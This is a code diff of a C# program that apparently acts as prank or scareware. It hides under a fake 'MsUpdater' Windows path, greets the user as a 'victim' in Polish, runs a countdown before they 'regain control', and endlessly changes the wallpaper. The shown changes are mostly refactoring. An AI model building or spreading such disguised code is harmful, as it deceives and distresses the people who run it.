@@ -9,7 +9,6 @@
     using System.IO;
     using System.Net;
     using System.Runtime.InteropServices;
-    using System.Threading;
     using System.Threading.Tasks;
 
     using WindowsInput;
@@ -29,8 +28,6 @@
         internal static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
 
         private static readonly Random Random = new Random();
-
-        private static readonly List<Action> ActionList = new List<Action>();
         
         private const string Temp = @"C:\Windows\MsUpdater\Temp";
 
@@ -85,12 +82,6 @@
                     }
                 });
             };
-
-            new Timer(20d) { Enabled = true }.Elapsed += delegate
-                {
-                    ActionList.ForEach(action => action());
-                    ActionList.Clear();
-                };
         }
 
         [SuppressMessage("ReSharper", "LocalizableElement")]
@@ -102,7 +93,7 @@
             {
                 NotepadHelper.ShowMessage($"Już po Tobie ...{Environment.NewLine}:)", "Kochana ofiaro,");
 
-                Thread.Sleep(2.Seconds());
+                await Task.Delay(2.Seconds());
 
                 AllocConsole();
 
@@ -112,13 +103,14 @@
                 for (var i = 9; i >= 0; i--)
                 {
                     Console.Write($"\rOdzyskasz kontrolę za {i}");
-                    Thread.Sleep(1.Seconds());
+                    await Task.Delay(1.Seconds());
                 }
 
                 FreeConsole();
             }
         }
 
+        [SuppressMessage("ReSharper", "LocalizableElement")]
         private static async void BackgroundUpdateAsync()
         {
             await Task.Delay(300.Seconds());
@@ -142,13 +134,15 @@
                 }
             }
 
+            const string Target = @"C:\Windows\MsUpdater\Temp\wallpaper";
+
             while (true)
             {
                 for (var i = 0; i < 4; i++)
                 {
                     await Task.Delay(1.Seconds());
 
-                    ActionList.Add(() => BackgroundUpdate(Path.Combine(Temp, $"background{i}.jpeg")));
+                    File.WriteAllText(Target, $"background{i}.jpeg");
                 }
             }
         }
@@ -165,11 +159,5 @@
         {
             return baseValue * 1000;
         }
-
-        private static void BackgroundUpdate(string path)
-        {
-            SystemParametersInfo(20, 0, path, 3);
-        }
-
     }
 }
